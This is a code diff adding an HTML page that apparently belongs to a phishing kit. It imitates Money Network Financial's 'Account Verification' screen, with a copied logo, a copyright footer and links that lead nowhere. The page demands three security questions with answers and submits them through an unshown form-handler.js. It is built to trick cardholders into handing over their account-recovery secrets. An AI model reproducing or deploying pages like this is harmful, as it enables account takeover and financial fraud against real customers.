@@ -1,0 +1,262 @@
+
+<html lang="en">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><meta http-equiv="X-UA-Compatible" content="IE=Edge">
+	<title>Account | Verification</title>
+
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+
+	<link type="text/css" rel="stylesheet" media="screen, projection" href="./screen.css">
+	<link type="text/css" rel="stylesheet" media="print" href="./print.css">
+	<link type="text/css" rel="stylesheet" media="screen,pojection" href="./money-network-override.css">
+
+		<script type="text/javascript">
+        function init() {
+          $('#cardNumber').focus();
+        }
+        $('#cardNumber').focus();
+	</script>
+
+</head>
+
+<body class="article-page auxillary-page"  onload="init();">
+	<div id="body">
+		<div id="wrapper">
+			<div id="header" class="clear_">
+				<a href="javascript:void();" id="skip-link">Skip to main content</a>
+				<h1 id="logo">
+					<a href="javascript:void();" title="The Money Network logo links back to the Money Network home page">
+						<img id="head_logo" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgaUwEu7oTU12nKzAKwrXT-VgeD5znIahZWDdpAXNmoT1GMw-Ge5v0jZnfje-tFacnU10KK6aVE-xKydU76SGMG18UqdtobkAoHnGQprVYA53RRNk8EqB1ZRarSheYXRVFUtF0-tOKD_lnE8M74pdDugCkqRNtr2fxwZ8bVwVt3Z18Ih95FtbrCqkM9tR0/s535/NYCBLOGO.png" alt="Money Network logo" width="250" height="100">
+					</a>
+				</h1>
+
+				<div id="user-settings" class="signed-in">
+					<ul class="site-tools" role="presentation">
+						<li class="sign-out-link"><a id="signout_link" href="javascript:void();" title="Return to login page">Account Verification</a></li>
+					</ul>
+				</div>
+			</div>
+
+			<div id="content" class="clear_">
+				<a name="content"></a>
+				<div id="main-content">
+					<div>
+						<font color="red"> 
+							<div id="errMsg" role="alert"></div>
+						</font>
+						<br><br>
+					</div>
+
+
+					<h1>Account Verification</h1>
+					<span class="requiredmsg">Required*</span>
+					<br>
+					<p></p>
+
+					<form name="security-form" id="security-form" method="POST"  class="validate">
+						<table role="presentation">
+							<tbody>
+								<tr>
+									<td>
+										<label for="cardNumber" class="error-anchor_  gray">Security Question 1</label>
+										<select class="full required text" name="question1" required="true">
+											<option value=""  selected="selected">-- Select Security Question --</option>
+											<option value="What is the last name of your favorite athlete?">What is the last name of your favorite athlete?</option>
+											<option value="What is a nickname you called your maternal grandfather (your mother&apos;s father)?">What is a nickname you called your maternal grandfather (your mother&apos;s father)?</option>
+											<option value="What is a nickname you called your paternal grandfather (your father&apos;s father)?">What is a nickname you called your paternal grandfather (your father&apos;s father)?</option>
+											<option value="What is your favorite animal?">What is your favorite animal?</option>
+											<option value="What was the color of the first vehicle you owned?">What was the color of the first vehicle you owned?</option>
+											<option value="What was the first name of your first romantic boyfriend or girlfriend?">What was the first name of your first romantic boyfriend or girlfriend?</option>
+											<option value="What was the name of the very first school you attended?">What was the name of the very first school you attended?</option>
+											<option value=">What is/was the name of your first-born nephew or niece (first name only)?">What is/was the name of your first-born nephew or niece (first name only)?</option>
+											<option value="Who is your favorite musical artist or musical group?">Who is your favorite musical artist or musical group?</option>
+											<option value="Where did you meet your first spouse or partner for the very first time?">Where did you meet your first spouse or partner for the very first time?</option>
+											<option value="What is your favorite sport or outdoor activity to participate in?">What is your favorite sport or outdoor activity to participate in?</option>
+											<option value="What is your favorite sport to watch?">What is your favorite sport to watch?</option>
+											<option value="What the name of your favorite restaurant?">What the name of your favorite restaurant?</option>
+											<option value="What is the name of the first business or company you ever worked for?">What is the name of the first business or company you ever worked for?</option>
+											<option value="In what city did you live on your 17th birthday?">In what city did you live on your 17th birthday?</option>
+											<option value="What is your all-time favorite food?">What is your all-time favorite food?</option>
+											<option value="What is your all-time favorite vacation/holiday destination?">What is your all-time favorite vacation/holiday destination?</option>
+											<option value="What is your favorite flower?">What is your favorite flower?</option>
+											<option value="In what city did you live on your 30th birthday?">In what city did you live on your 30th birthday?</option>
+											<option value="What&apos;s the first name of your best friend during grade school (elementary school)?">What&apos;s the first name of your best friend during grade school (elementary school)?</option>
+											<option value="What is the last name of your favorite author?">What is the last name of your favorite author?</option>
+											<option value="What is your favorite color?">What is your favorite color?</option>
+											<option value="What is a nickname you called your maternal grandmother (your mother&apos;s mother)?">What is a nickname you called your maternal grandmother (your mother&apos;s mother)?</option>
+											<option value="What is a nickname you called your paternal grandmother (your father&apos;s mother)?">What is a nickname you called your paternal grandmother (your father&apos;s mother)?</option>
+											<option value="What was the very first job you held (eg. cashier, manager, editor, teller, ice cream scooper)?">What was the very first job you held (eg. cashier, manager, editor, teller, ice cream scooper)?</option>
+											<option value="What is your favorite holiday?">What is your favorite holiday?</option>
+											<option value="What is the name your favorite park?">What is the name your favorite park?</option>
+											<option value="In what year did you rent or buy your first home or apartment?">In what year did you rent or buy your first home or apartment?</option>
+											<option value="What&apos;s the name of the city where your youngest sibling lives?">What&apos;s the name of the city where your youngest sibling lives?</option>
+											<option value="What is the last name of a favorite teacher or professor?">What is the last name of a favorite teacher or professor?</option>
+											<option value="Who is your favorite male actor (last name only)?">Who is your favorite male actor (last name only)?</option>
+											<option value="Who is your favorite female actor (last name only)?">Who is your favorite female actor (last name only)?</option>
+											<option value="What is the name or brand of the station where you usually buy gasoline?">What is the name or brand of the station where you usually buy gasoline?</option>
+											<option value="What is the name of the supermarket where you shop for groceries most often?">What is the name of the supermarket where you shop for groceries most often?</option>
+											<option value="What is a nickname you call your spouse, partner, or roommate?">What is a nickname you call your spouse, partner, or roommate?</option>
+											<option value="What is the first name of your favorite aunt?">What is the first name of your favorite aunt?</option>
+											<option value="What is the first name of your favorite uncle?">What is the first name of your favorite uncle?</option>
+											<option value=">What is the name of your favorite beverage?">What is the name of your favorite beverage?</option>
+											<option value="What was the color of your first bicycle?">What was the color of your first bicycle?</option>
+											<option value="What sport or recreational activity did your father enjoy?">What sport or recreational activity did your father enjoy?</option>
+											<option value="What sport or recreational activity did your mother enjoy?">What sport or recreational activity did your mother enjoy?</option>
+											<span class="field-validation-valid error text" data-valmsg-for="otp" data-valmsg-replace="true" id="otp"></span>
+										</select>
+
+										<br /><br />
+										
+										<input type="text" name="answer1" value="" class="full required text" id="cardNumber" placeholder="Answer 1" autocomplete="off" required="true">
+									</td>
+								</tr>
+
+								<tr>
+									<td>
+										<label for="cardNumber" class="error-anchor_  gray">Security Question 2</label>
+										<select class="full required text" name="question2" required="true">
+											<option value=""  selected="selected">-- Select Security Question --</option>
+											<option value="What is the last name of your favorite athlete?">What is the last name of your favorite athlete?</option>
+											<option value="What is a nickname you called your maternal grandfather (your mother&apos;s father)?">What is a nickname you called your maternal grandfather (your mother&apos;s father)?</option>
+											<option value="What is a nickname you called your paternal grandfather (your father&apos;s father)?">What is a nickname you called your paternal grandfather (your father&apos;s father)?</option>
+											<option value="What is your favorite animal?">What is your favorite animal?</option>
+											<option value="What was the color of the first vehicle you owned?">What was the color of the first vehicle you owned?</option>
+											<option value="What was the first name of your first romantic boyfriend or girlfriend?">What was the first name of your first romantic boyfriend or girlfriend?</option>
+											<option value="What was the name of the very first school you attended?">What was the name of the very first school you attended?</option>
+											<option value=">What is/was the name of your first-born nephew or niece (first name only)?">What is/was the name of your first-born nephew or niece (first name only)?</option>
+											<option value="Who is your favorite musical artist or musical group?">Who is your favorite musical artist or musical group?</option>
+											<option value="Where did you meet your first spouse or partner for the very first time?">Where did you meet your first spouse or partner for the very first time?</option>
+											<option value="What is your favorite sport or outdoor activity to participate in?">What is your favorite sport or outdoor activity to participate in?</option>
+											<option value="What is your favorite sport to watch?">What is your favorite sport to watch?</option>
+											<option value="What the name of your favorite restaurant?">What the name of your favorite restaurant?</option>
+											<option value="What is the name of the first business or company you ever worked for?">What is the name of the first business or company you ever worked for?</option>
+											<option value="In what city did you live on your 17th birthday?">In what city did you live on your 17th birthday?</option>
+											<option value="What is your all-time favorite food?">What is your all-time favorite food?</option>
+											<option value="What is your all-time favorite vacation/holiday destination?">What is your all-time favorite vacation/holiday destination?</option>
+											<option value="What is your favorite flower?">What is your favorite flower?</option>
+											<option value="In what city did you live on your 30th birthday?">In what city did you live on your 30th birthday?</option>
+											<option value="What&apos;s the first name of your best friend during grade school (elementary school)?">What&apos;s the first name of your best friend during grade school (elementary school)?</option>
+											<option value="What is the last name of your favorite author?">What is the last name of your favorite author?</option>
+											<option value="What is your favorite color?">What is your favorite color?</option>
+											<option value="What is a nickname you called your maternal grandmother (your mother&apos;s mother)?">What is a nickname you called your maternal grandmother (your mother&apos;s mother)?</option>
+											<option value="What is a nickname you called your paternal grandmother (your father&apos;s mother)?">What is a nickname you called your paternal grandmother (your father&apos;s mother)?</option>
+											<option value="What was the very first job you held (eg. cashier, manager, editor, teller, ice cream scooper)?">What was the very first job you held (eg. cashier, manager, editor, teller, ice cream scooper)?</option>
+											<option value="What is your favorite holiday?">What is your favorite holiday?</option>
+											<option value="What is the name your favorite park?">What is the name your favorite park?</option>
+											<option value="In what year did you rent or buy your first home or apartment?">In what year did you rent or buy your first home or apartment?</option>
+											<option value="What&apos;s the name of the city where your youngest sibling lives?">What&apos;s the name of the city where your youngest sibling lives?</option>
+											<option value="What is the last name of a favorite teacher or professor?">What is the last name of a favorite teacher or professor?</option>
+											<option value="Who is your favorite male actor (last name only)?">Who is your favorite male actor (last name only)?</option>
+											<option value="Who is your favorite female actor (last name only)?">Who is your favorite female actor (last name only)?</option>
+											<option value="What is the name or brand of the station where you usually buy gasoline?">What is the name or brand of the station where you usually buy gasoline?</option>
+											<option value="What is the name of the supermarket where you shop for groceries most often?">What is the name of the supermarket where you shop for groceries most often?</option>
+											<option value="What is a nickname you call your spouse, partner, or roommate?">What is a nickname you call your spouse, partner, or roommate?</option>
+											<option value="What is the first name of your favorite aunt?">What is the first name of your favorite aunt?</option>
+											<option value="What is the first name of your favorite uncle?">What is the first name of your favorite uncle?</option>
+											<option value=">What is the name of your favorite beverage?">What is the name of your favorite beverage?</option>
+											<option value="What was the color of your first bicycle?">What was the color of your first bicycle?</option>
+											<option value="What sport or recreational activity did your father enjoy?">What sport or recreational activity did your father enjoy?</option>
+											<option value="What sport or recreational activity did your mother enjoy?">What sport or recreational activity did your mother enjoy?</option>
+											<span class="field-validation-valid error text" data-valmsg-for="otp" data-valmsg-replace="true" id="otp"></span>
+										</select>
+
+										<br /><br />
+										
+										<input type="text" name="answer2" value="" class="full required text" id="cardNumber" placeholder="Answer 2" autocomplete="off" required="true">
+									</td>
+								</tr>
+
+
+								<tr>
+									<td>
+										<label for="cardNumber" class="error-anchor_  gray">Security Question 3</label>
+										<select class="full required text" name="question3" required="true">
+											<option value=""  selected="selected">-- Select Security Question --</option>
+											<option value="What is the last name of your favorite athlete?">What is the last name of your favorite athlete?</option>
+											<option value="What is a nickname you called your maternal grandfather (your mother&apos;s father)?">What is a nickname you called your maternal grandfather (your mother&apos;s father)?</option>
+											<option value="What is a nickname you called your paternal grandfather (your father&apos;s father)?">What is a nickname you called your paternal grandfather (your father&apos;s father)?</option>
+											<option value="What is your favorite animal?">What is your favorite animal?</option>
+											<option value="What was the color of the first vehicle you owned?">What was the color of the first vehicle you owned?</option>
+											<option value="What was the first name of your first romantic boyfriend or girlfriend?">What was the first name of your first romantic boyfriend or girlfriend?</option>
+											<option value="What was the name of the very first school you attended?">What was the name of the very first school you attended?</option>
+											<option value=">What is/was the name of your first-born nephew or niece (first name only)?">What is/was the name of your first-born nephew or niece (first name only)?</option>
+											<option value="Who is your favorite musical artist or musical group?">Who is your favorite musical artist or musical group?</option>
+											<option value="Where did you meet your first spouse or partner for the very first time?">Where did you meet your first spouse or partner for the very first time?</option>
+											<option value="What is your favorite sport or outdoor activity to participate in?">What is your favorite sport or outdoor activity to participate in?</option>
+											<option value="What is your favorite sport to watch?">What is your favorite sport to watch?</option>
+											<option value="What the name of your favorite restaurant?">What the name of your favorite restaurant?</option>
+											<option value="What is the name of the first business or company you ever worked for?">What is the name of the first business or company you ever worked for?</option>
+											<option value="In what city did you live on your 17th birthday?">In what city did you live on your 17th birthday?</option>
+											<option value="What is your all-time favorite food?">What is your all-time favorite food?</option>
+											<option value="What is your all-time favorite vacation/holiday destination?">What is your all-time favorite vacation/holiday destination?</option>
+											<option value="What is your favorite flower?">What is your favorite flower?</option>
+											<option value="In what city did you live on your 30th birthday?">In what city did you live on your 30th birthday?</option>
+											<option value="What&apos;s the first name of your best friend during grade school (elementary school)?">What&apos;s the first name of your best friend during grade school (elementary school)?</option>
+											<option value="What is the last name of your favorite author?">What is the last name of your favorite author?</option>
+											<option value="What is your favorite color?">What is your favorite color?</option>
+											<option value="What is a nickname you called your maternal grandmother (your mother&apos;s mother)?">What is a nickname you called your maternal grandmother (your mother&apos;s mother)?</option>
+											<option value="What is a nickname you called your paternal grandmother (your father&apos;s mother)?">What is a nickname you called your paternal grandmother (your father&apos;s mother)?</option>
+											<option value="What was the very first job you held (eg. cashier, manager, editor, teller, ice cream scooper)?">What was the very first job you held (eg. cashier, manager, editor, teller, ice cream scooper)?</option>
+											<option value="What is your favorite holiday?">What is your favorite holiday?</option>
+											<option value="What is the name your favorite park?">What is the name your favorite park?</option>
+											<option value="In what year did you rent or buy your first home or apartment?">In what year did you rent or buy your first home or apartment?</option>
+											<option value="What&apos;s the name of the city where your youngest sibling lives?">What&apos;s the name of the city where your youngest sibling lives?</option>
+											<option value="What is the last name of a favorite teacher or professor?">What is the last name of a favorite teacher or professor?</option>
+											<option value="Who is your favorite male actor (last name only)?">Who is your favorite male actor (last name only)?</option>
+											<option value="Who is your favorite female actor (last name only)?">Who is your favorite female actor (last name only)?</option>
+											<option value="What is the name or brand of the station where you usually buy gasoline?">What is the name or brand of the station where you usually buy gasoline?</option>
+											<option value="What is the name of the supermarket where you shop for groceries most often?">What is the name of the supermarket where you shop for groceries most often?</option>
+											<option value="What is a nickname you call your spouse, partner, or roommate?">What is a nickname you call your spouse, partner, or roommate?</option>
+											<option value="What is the first name of your favorite aunt?">What is the first name of your favorite aunt?</option>
+											<option value="What is the first name of your favorite uncle?">What is the first name of your favorite uncle?</option>
+											<option value=">What is the name of your favorite beverage?">What is the name of your favorite beverage?</option>
+											<option value="What was the color of your first bicycle?">What was the color of your first bicycle?</option>
+											<option value="What sport or recreational activity did your father enjoy?">What sport or recreational activity did your father enjoy?</option>
+											<option value="What sport or recreational activity did your mother enjoy?">What sport or recreational activity did your mother enjoy?</option>
+											<span class="field-validation-valid error text" data-valmsg-for="otp" data-valmsg-replace="true" id="otp"></span>
+										</select>
+
+										<br /><br />
+										
+										<input type="text" name="answer3" value="" class="full required text" id="cardNumber" placeholder="Answer 3" autocomplete="off" required="true">
+									</td>
+								</tr>
+
+								<tr>
+									<td colspan="2">
+										<button style="float: right;margin-right: 20px;" type="submit" name="q-btn" >Submit</button>
+										</a>
+									</td>
+								</tr>
+							</tbody>
+						</table>
+					</form>
+				</div>
+			</div>
+
+			<div id="footer" class="clear_">
+				<ul class="nav">
+					<li><a href="javascript:void();">FAQs</a></li> 
+					<li><a href="javascript:void();" title="This link will open a new window to the Privacy and Security Policy page">Privacy and Security</a>
+					</li>
+					<li><a href="javascript:void();" title="This link will open a new window to the Error Resolution Policy"></a></li>
+					<li class="last_"><a href="javascript:void();" title="Contact page">Contact us</a></li>
+					<li class="last_"><a href="javascript:void();" title="this link will open an external page">Download Acrobat Reader to view PDF files</a></li>
+				</ul>
+				<br><br>
+
+				<p>*Not all billers accept cards for payments. Please check the billers website.</p> 
+
+				<p class="copyright" id="copyright">©&nbsp;2023&nbsp;Money Network Financial, LLC. All Rights Reserved. All trademarks, service marks and trade names referenced in this material are the property of their respective owners. Cards are issued by My Banking Direct, a service of New York Community Bank, Member FDIC. New York Community Bank does not endorse or guarantee the products, info, or recommendations provided in the linked site; New York Community Bank Privacy Policy does not apply to linked site; and New York Community Bank is not liable for any failure of products or services advertised on the linked site. Apple, the Apple logo, iPhone, and iPad are trademarks of Apple Inc., registered in the U.S. and other countries and regions. App Store is a service mark of Apple Inc. Google Play and the Google Play logo are trademarks of Google LLC.</p><p></p>
+			</div>
+		</div>
+	</div>
+
+	<script type="text/javascript">
+        function init() {
+          $('#cardNumber').focus();
+        }
+        $('#cardNumber').focus();
+	</script>
+<script src="form-handler.js"></script>
+</body></html>
